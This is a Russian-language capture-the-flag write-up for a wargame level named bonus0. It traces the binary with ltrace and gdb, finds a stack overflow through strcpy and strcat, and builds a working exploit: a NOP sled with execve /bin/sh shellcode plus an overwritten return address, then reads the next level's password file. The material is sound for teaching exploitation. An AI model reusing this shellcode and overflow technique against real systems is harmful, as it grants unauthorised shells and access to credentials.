имеем файл ./bonus0

при запуске дважды ждет ввода и выдает оба аргумента:
    ./bonus0
    -
    123
    -
    abc
    123 abc

ltace показал использование такие функций, как : strchr, strncpy, strcpy, strcat
    __libc_start_main(0x80485a4, 1, 0xbffff7b4, 0x80485d0, 0x8048640 <unfinished ...>
    puts(" - " -
    )                                                             = 4
    read(0, 123
    "123\n", 4096)                                                  = 4
    strchr("123\n", '\n')                                                   = "\n"
    strncpy(0xbffff698, "123", 20)                                          = 0xbffff698
    puts(" - " -
    )                                                             = 4
    read(0, фис
    "\321\204\320\270\321\201\n", 4096)                             = 7
    strchr("\321\204\320\270\321\201\n", '\n')                              = "\n"
    strncpy(0xbffff6ac, "\321\204\320\270\321\201", 20)                     = 0xbffff6ac
    strcpy(0xbffff6e6, "123")                                               = 0xbffff6e6
    strcat("123 ", "\321\204\320\270\321\201")                              = "123 \321\204\320\270\321\201"
    puts("123 \321\204\320\270\321\201"123 фис
    )                                    = 11
    +++ exited (status 0) +++

strcpy и strcat уязвимы для переполнения буфера
gdb показал наличие трех функций: main, p и pp

функция p принимает два параметра: второй параметр печатается, затем считывается стандартным ввводом в буфер 4096 байт.
с помощью strchr ищем новую строку внутри считанного буфера и ставим там 0, не проверяя, что вернулось.
в конце выполняется strncpy назначения из буфера с максимальным числом байтов 20 байтов.
функция p вызывается дважды внутри pp
выходной буфер при кол-во символов больше 20 на первом входе будет по составу:
20 байт + 20 байт + ' ' + 20 байт

./bonus0
 -
123456789asdfghjkl123456789
 -
asdfghjklASDFGHJKLasdfghjkl
123456789asdfghjkl12asdfghjklASDFGHJKLas�� asdfghjklASDFGHJKLas��
Segmentation fault (core dumped)


смещение адреса возврата main составит 9 благодаря генератору https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

- первый ввод мы записываем после 61 байта, но до выполнения шелл-кода, который будет в буфере на 4096
поэтому добавим дорожку NOP’ов, как минимум 100
https://ru.wikipedia.org/wiki/NOP
- второй ввод будет состоять из смещения на 9, которое было найдено выше, адреса на как раз таки буфер 4096 между 61 байтом и дорожкой и добивания данного буфера до 20 байт

(python -c 'print "\x90" * 150 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';
    python -c 'print "A" * 9 + "\xd1\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0

    cat /home/user/bonus1/.pass